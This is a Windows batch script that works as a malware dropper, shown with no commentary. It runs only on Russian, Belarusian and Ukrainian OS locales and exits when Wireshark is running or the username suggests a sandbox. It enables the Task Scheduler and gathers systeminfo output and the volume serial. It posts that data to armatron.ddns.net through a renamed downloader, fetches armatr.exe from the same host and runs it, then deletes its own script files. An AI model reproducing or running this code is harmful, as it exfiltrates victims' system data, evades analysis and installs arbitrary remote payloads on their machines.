@echo off
setlocal ENABLEDELAYEDEXPANSION
for /f %%x in ('wmic OS get oslanguage') do set /a RUSOS=%%x
if "%RUSOS%"=="1049" goto mout
if "%RUSOS%"=="2073" goto mout
if "%RUSOS%"=="1058" goto mout
goto ends

:mout
SetLocal EnableExtensions

Set ProcessName=wireshark.exe
TaskList /FI "ImageName EQ %ProcessName%" | Find /I "%ProcessName%"
If %ErrorLevel% NEQ 1 goto ends

set name=%username%
if "%name%"=="MALTEST" goto ends
if "%name%"=="MALWARETEST" goto ends
if "%name%"=="TEQUILABOOMBOOM" goto ends
if "%name%"=="SANDBOX" goto ends
if "%name%"=="VIRUS" goto ends
if "%name%"=="MALWARE" goto ends
if "%name%"=="MALWARES" goto ends
if "%name%"=="TEST" goto ends
if "%name%"=="TROYAN" goto ends


sc query type= service | findstr /i "Schedule"
if errorlevel 1 (
net start Schedule
sc config Schedule start= auto
)

ver | find "Microsoft Windows XP" > nul 
if not errorlevel 1 goto win_xp 
goto win_7 

:win_xp
set dirstr=%WINDIR%\system32\microsoft\UpdatesDisk\Guard
goto run

:win_7
set dirstr=%APPDATA%\microsoft\UpdatesDisk\Guard
goto run


:run
MD "%dirstr%"

SetLocal EnableDelayedExpansion
For /F "Tokens=4*" %%B In ('vol c:') Do set updates=%%B
set updates=%updates:-=%
echo %updates%>updates.ini

if not exist "%dirstr%\updates.ini" copy "%CD%\updates.ini" "%dirstr%\" /y


set /p comment=< "%dirstr%\updates.ini"

taskkill /f /im WinHost.exe
chcp 1251 >nul

SetLocal EnableDelayedExpansion
systeminfo > system.ini
FOR /F "tokens=*" %%i IN (system.ini) do @IF NOT X%%i==X set infosys=!infosys!%%i+###

set IDs=%computername%
set domen=http://armatron.ddns.net
set tel=armatr.exe

"%CD%"\WinHost.exe --post-data="comp=%computername%&id=%IDs: =%_%comment: =%&sysinfo=%infosys%" "%domen%" -q -N %domen% -O %tel%
ping 127.0.0.1
for %%i in (%tel%) do (set /a size=%%~Zi)
if %size% == 0 goto ends
"%CD%\%tel%"
ping 127.0.0.1
ping 127.0.0.1

:ends
del /Q /F "%CD%\*.cmd"
exit

